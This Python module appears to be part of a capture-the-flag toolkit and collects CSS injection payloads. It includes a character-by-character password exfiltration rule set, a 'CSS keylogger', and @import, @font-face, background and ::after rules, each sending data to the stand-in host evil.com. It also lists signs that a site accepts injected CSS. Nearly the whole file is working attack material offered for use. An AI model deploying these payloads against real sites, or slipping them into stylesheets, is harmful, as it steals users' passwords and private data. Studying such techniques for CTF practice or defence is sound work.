"""
CSS Injection Payload Crafter for Web CTF.
Covers CSS-based data exfiltration, attribute selectors, and CSS keylogging.
"""

from typing import List, Dict


def get_css_injection_payloads() -> List[Dict[str, str]]:
    """Generate CSS injection payloads."""
    return [
        {
            "name": "Attribute Selector Exfiltration",
            "payload": """input[name="password"][value^="a"] { background: url(http://evil.com/?c=a); }
input[name="password"][value^="b"] { background: url(http://evil.com/?c=b); }""",
            "desc": "CSS attribute selectors exfiltrate input values char by char."
        },
        {
            "name": "CSS Keylogger",
            "payload": """input[type="password"][value$="a"] { background: url(http://evil.com/?k=a); }
input[type="password"][value$="b"] { background: url(http://evil.com/?k=b); }""",
            "desc": "CSS keylogger using value$= selectors."
        },
        {
            "name": "CSS Exfiltration via Background",
            "payload": """#secret { background: url(http://evil.com/?data=leaked); }""",
            "desc": "Exfiltrates data via background image request."
        },
        {
            "name": "CSS @import Exfiltration",
            "payload": "@import url(http://evil.com/?data=leaked);",
            "desc": "@import rule to exfiltrate data."
        },
        {
            "name": "CSS Font Exfiltration",
            "payload": """@font-face { font-family: 'x'; src: url(http://evil.com/?data=leaked); }""",
            "desc": "@font-face rule to exfiltrate data."
        },
        {
            "name": "CSS Content Exfiltration",
            "payload": """#secret::after { content: url(http://evil.com/?data=leaked); }""",
            "desc": "::after pseudo-element to exfiltrate data."
        },
        {
            "name": "CSS Attribute Value Exfil",
            "payload": """[data-secret="flag{"] { background: url(http://evil.com/?f=1); }""",
            "desc": "Attribute value selector to detect flag content."
        }
    ]


def get_css_injection_indicators() -> List[Dict[str, str]]:
    """Indicators that CSS injection is possible."""
    return [
        {
            "indicator": "User-controlled CSS",
            "desc": "If the app allows user-controlled CSS or style injection."
        },
        {
            "indicator": "Reflected CSS",
            "desc": "If user input is reflected in a <style> tag or style attribute."
        },
        {
            "indicator": "CSS in email",
            "desc": "If the app renders user-controlled CSS in emails."
        }
    ]
